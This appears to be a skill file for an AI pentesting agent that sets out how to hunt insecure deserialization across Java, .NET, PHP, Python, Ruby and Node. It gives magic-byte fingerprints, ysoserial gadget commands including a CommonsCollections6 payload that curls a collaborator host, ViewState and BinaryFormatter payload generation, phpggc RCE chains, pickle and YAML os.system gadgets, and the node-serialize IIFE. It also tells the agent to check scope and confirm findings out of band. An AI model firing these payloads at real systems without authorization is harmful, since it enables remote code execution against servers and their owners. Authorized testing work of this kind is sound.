---
name: hunt-deserialization
description: Insecure deserialization hunting across Java / .NET / PHP / Python / Ruby / Node. Gadget-chain RCE, OOB-gated blind detection, magic-byte fingerprinting. Wiki-first, FIND schema output.
---

# Hunt: Insecure Deserialization

## Pre-Attack: Wiki Query (MANDATORY)
```
qmd_query "insecure deserialization gadget chain ysoserial" via wiki-search MCP -> read matching page.
```
Core page: [[insecure-deserialization]]. Related: [[os-command-injection]] (RCE sink), [[wiki/payloads/ssrf]] (URLDNS/blind probe).

**Self-heal:** wiki query empty -> create stub `wiki/techniques/web/insecure-deserialization.md` before proceeding.

## Scope Check
- Confirm target in scope. Read `Deadends.md` - skip exhausted sinks.

## OOB Gate (READ FIRST)
**Blind deserialization RCE claims require OOB confirmation. No exceptions.**
First payload is always a benign OOB probe, not a command. Java `URLDNS` / `JRMPClient` cause a DNS/TCP callback with zero code exec risk - use it to prove the sink deserializes attacker data before firing a gadget.

NOT confirmation: stack trace, type error, 500 alone. IS confirmation: DNS/HTTP hit to your unique interactsh subdomain, or time-delay gadget reliably toggling.

When you plant the OOB probe (URLDNS/JRMPClient or any blind payload), append a row to `targets/<eng>/oob.md`: `| <token> | <sink url+param> | deser | <date> | waiting | |` (columns: token | sink | class | planted | status | source, where token = your unique interactsh label). The recon-capture hook auto-correlates incoming callbacks to flip the row to HIT and SessionStart surfaces HITs; a HIT row is the confirmation gate to scaffold the FIND. Do NOT claim a blind deserialization finding without a HIT row.

## Attack Surface Signals
Fingerprint serialized blobs by magic bytes / shape:
```
rO0AB...                      Java (base64, 0xAC 0xED 0x00 0x05)
AAEAAAD/////                  .NET BinaryFormatter (base64)
a:2:{... / O:8:"stdClass":    PHP serialize()
gASV / \x80\x04 / \x80\x05    Python pickle (base64 gAS...)
BAh... / --- !ruby/object     Ruby Marshal / YAML
```
Sink locations: cookies (`session`, `auth`, `state`, `viewstate`), hidden form fields, `Authorization`, API JSON with type hints, message queues, cache, file upload of `.ser`/`.pickle`.

## Methodology
1. Locate serialized data (decode base64, match magic bytes above).
2. **Java:**
```bash
java -jar ysoserial.jar URLDNS "http://probe.<collab>" | base64 -w0     # OOB probe FIRST
java -jar ysoserial.jar CommonsCollections6 "curl http://<collab>/x" | base64 -w0   # after sink confirmed
# .NET ViewState: known machineKey -> ysoserial.net -p ViewState
```
3. **.NET:** `ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd"`; ViewState via `ysoserial.net -p ViewState --generator=... --validationkey=...`.
4. **PHP:** craft POP chain from app's `__wakeup`/`__destruct`/`__toString`; `phpggc Framework/RCE1 system id`. Look for `unserialize()` on user input, phar:// (deser via filesystem funcs).
5. **Python:** `pickle.loads` on user data -> `__reduce__` returning `(os.system, ("cmd",))`. yaml.load (unsafe) -> `!!python/object/apply:os.system`.
6. **Ruby:** Marshal.load / unsafe YAML.load -> universal gadget chains (`Gem::...`).
7. **Node:** `node-serialize` `_$$ND_FUNC$$_` IIFE; `funcster`, `serialize-javascript` sinks.
8. **Distill to wiki (when confirmed):** if the finding is a reusable gadget chain or framework sink, stage a GENERIC wiki candidate now (no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/insecure-deserialization.md`. Promote later via `scripts/wiki-promote.py`.

## FIND Output
Confirmed (OOB callback or reliable exec):
```
Create Vulns/Research/FIND-XXX-CRITICAL-deserialization-rce-<host>.md
Add row to Vuln-index.md: | FIND-XXX | <stack> deser RCE | host | CONFIRMED |
```
Severity: CRITICAL if command exec / OOB code callback; HIGH if file read/SSRF-only gadget; MEDIUM if DoS-only.

Exhausted (sink deserializes - URLDNS fired - but no working RCE gadget after gadget-set sweep; or no callback after 30+ payloads):
```
Append to Deadends.md: - [ ] <host> <param> -- Java sink confirmed (URLDNS hit) but CC1-7/Spring/Hibernate no exec (hardened classpath / look-ahead filter)
```

Report: Status + files created.
